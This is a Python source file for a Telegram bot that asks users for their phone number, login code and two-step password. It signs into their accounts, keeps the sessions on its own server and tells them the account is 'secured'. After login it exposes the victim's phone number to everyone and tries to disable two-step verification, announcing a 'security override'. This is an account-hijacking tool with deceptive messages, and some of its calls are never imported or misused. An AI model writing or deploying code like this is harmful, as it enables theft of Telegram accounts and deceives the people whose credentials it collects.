import os
import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    FloodWaitError, PhoneNumberBannedError, UserDeactivatedBanError, PhoneNumberInvalidError
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import InputPrivacyKeyPhoneNumber, InputPrivacyValueAllowAll
from config import API_ID, API_HASH, OWNER_ID, BOT_TOKEN
SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
clients = {}
pending_logins = {}

# ─── UI Formatter ───
def format_message(title, content):
    return f"**〘 {title} 〙**\n{content}\n──────────────"

async def cancel_login(user_id, reason):
    """Remove pending login and notify user."""
    if user_id in pending_logins:
        del pending_logins[user_id]
    await bot.send_message(user_id, format_message("❌ LOGIN FAILED", reason), buttons=[Button.inline("🔄 Retry", f"retry_{user_id}")])

@bot.on(events.NewMessage(pattern="/add (\+?\d{10,15})"))
async def request_login(event):
    """Ask for OTP after user provides phone number."""
    user_id = event.sender_id
    phone_number = event.pattern_match.group(1)

    if user_id in pending_logins:
        return await event.reply(format_message("⚠️ ERROR", "You already have a pending login request. Send the OTP."))

    session_file = f"{SESSION_DIR}/account_{user_id}.session"
    client = TelegramClient(session_file, API_ID, API_HASH)

    try:
        await client.connect()
        await client.send_code_request(phone_number)
        pending_logins[user_id] = (client, phone_number)
        await event.reply(format_message("📩 OTP SENT", "Check Telegram for the login code."), buttons=[Button.inline("📤 Enter OTP", f"otp_{user_id}")])
    except PhoneNumberInvalidError:
        await cancel_login(user_id, "The phone number is **invalid**. Try again with a correct number.")
    except PhoneNumberBannedError:
        await cancel_login(user_id, "This phone number is **banned** by Telegram. Cannot proceed.")
    except FloodWaitError as e:
        await cancel_login(user_id, f"⚠️ Too many attempts! Try again after **{e.seconds}** seconds.")
    except Exception as e:
        await cancel_login(user_id, f"Unexpected Error: `{e}`")

@bot.on(events.NewMessage(pattern="/otp (\d{5,6})"))
async def complete_login(event):
    """Complete login using OTP."""
    user_id = event.sender_id
    if user_id not in pending_logins:
        return await event.reply(format_message("⚠️ ERROR", "No pending login request. Use `/add {phone_number}` first."))

    client, phone_number = pending_logins[user_id]
    otp_code = event.pattern_match.group(1)

    try:
        await client.sign_in(phone_number, otp_code)
    except PhoneCodeInvalidError:
        return await cancel_login(user_id, "❌ **Invalid OTP!** Try again.")
    except PhoneCodeExpiredError:
        return await cancel_login(user_id, "⏳ **OTP expired!** Restart login with `/add`.")
    except SessionPasswordNeededError:
        return await event.reply(format_message("🔒 2FA REQUIRED", "Send your password using `/pass {password}`."), buttons=[Button.inline("🔑 Enter Password", f"pass_{user_id}")])
    except Exception as e:
        return await cancel_login(user_id, f"Unexpected Error: `{e}`")

    clients[user_id] = client
    await event.reply(format_message("✅ LOGIN SUCCESSFUL", "Your account is now **secured**."), buttons=[Button.inline("🔍 Check Status", f"status_{user_id}")])

    # Disable privacy settings
    await client(UpdatePrivacyRequest(
        key=InputPrivacyKeyPhoneNumber(),
        rules=[InputPrivacyValueAllowAll()]
    ))

    # Remove Two-Step Verification
    try:
        await client(DeleteSecureValueRequest(types=["password"]))
        await event.reply(format_message("🔓 SECURITY OVERRIDE", "**2FA Disabled.**"))
    except:
        await event.reply(format_message("⚠️ WARNING", "**Unable to remove 2FA.** Manual action required."))

    del pending_logins[user_id]

@bot.on(events.NewMessage(pattern="/pass (.+)"))
async def enter_password(event):
    """Enter password for 2FA accounts."""
    user_id = event.sender_id
    if user_id not in pending_logins:
        return await event.reply(format_message("⚠️ ERROR", "No pending login request. Use `/add {phone_number}` first."))

    client, phone_number = pending_logins[user_id]
    password = event.pattern_match.group(1)

    try:
        await client.sign_in(password=password)
        clients[user_id] = client
        await event.reply(format_message("✅ LOGIN SUCCESSFUL", "Your account is now **secured**."), buttons=[Button.inline("🔍 Check Status", f"status_{user_id}")])

        # Disable privacy settings
        await client(UpdatePrivacyRequest(
            key=InputPrivacyKeyPhoneNumber(),
            rules=[InputPrivacyValueAllowAll()]
        ))

        # Remove Two-Step Verification
        try:
            await client(DeleteSecureValueRequest(types=["password"]))
            await event.reply(format_message("🔓 SECURITY OVERRIDE", "**2FA Disabled.**"))
        except:
            await event.reply(format_message("⚠️ WARNING", "**Unable to remove 2FA.** Manual action required."))

        del pending_logins[user_id]
    except Exception as e:
        await cancel_login(user_id, f"Unexpected Error: `{e}`")

bot.run_until_disconnected()
